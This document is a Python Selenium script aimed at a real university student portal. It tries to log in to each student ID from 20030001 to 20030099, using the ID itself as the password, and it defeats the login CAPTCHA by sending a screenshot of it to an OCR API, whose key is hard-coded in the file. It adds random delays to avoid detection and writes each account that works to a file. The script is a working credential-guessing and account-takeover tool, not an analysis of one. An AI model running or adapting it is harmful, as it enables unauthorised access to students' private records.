from selenium import webdriver
from selenium.webdriver.common import keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

import requests
import json
import time
import random

def ocr_space_file(filename, overlay=False, api_key='eea27ccc0688957', language='eng'):
    payload = {'isOverlayRequired': overlay,
               'apikey': api_key,
               'language': language,
               }
    with open(filename, 'rb') as f:
        r = requests.post('https://api.ocr.space/parse/image',
                          files={filename: f},
                          data=payload,
                          )
    return r.content.decode()

PATH = 'D:\chromedriver.exe'
    
sleepTime = random.randint(3,10)
for x in range(20030001,20030100):
    MSSV = str(x)
    Pass = str(x)


    driver = webdriver.Chrome(PATH)
    driver.get('https://sinhvien.bvu.edu.vn/Default.aspx')
    driver.set_window_position(2000,0)
    driver.maximize_window()
    time.sleep(sleepTime)

    inputUserName = driver.find_element_by_xpath('//*[@id="ctl00_ucRight1_txtMaSV"]')
    inputUserName.send_keys(MSSV)
    time.sleep(sleepTime)
    inputPassword = driver.find_element_by_xpath('//*[@id="ctl00_ucRight1_txtMatKhau"]')
    inputPassword.send_keys(Pass)
    time.sleep(sleepTime)

    #### input code from API #################################
    with open('Logo.png', 'wb') as file:
        l = driver.find_element_by_xpath('//*[@id="imgSecurityCode"]')
        file.write(l.screenshot_as_png)
    result = ocr_space_file(filename='Logo.png')
    result = json.loads(result)
    try:
        textDetected = result.get('ParsedResults')[0].get('ParsedText')
    except:
        pass
    inputCode = driver.find_element_by_xpath('//*[@id="ctl00_ucRight1_txtSercurityCode"]')
    inputCode.send_keys(textDetected[0:4])
    time.sleep(sleepTime)

    try:
        inputLogin = driver.find_element_by_xpath('//*[@id="ctl00_ucRight1_btnLogin"]')
        inputLogin.click()
        time.sleep(sleepTime)
        try:
            WebDriverWait(driver, 10).until(EC.alert_is_present())
            driver.switch_to.alert.accept()
            time.sleep(sleepTime)
        except:
            pass
    except:
        pass

    url = driver.current_url
    if 'HoSoSinhVien.aspx' in url:
        with open('result.txt','a') as f:
            f.writelines(f'OK: {MSSV} \n')
        
        driver.find_element_by_xpath('//*[@id="ctl00_ucRight1_lbtnLogout"]').click()
        time.sleep(sleepTime)
        driver.quit()
    else:
        time.sleep(sleepTime)
        driver.quit()



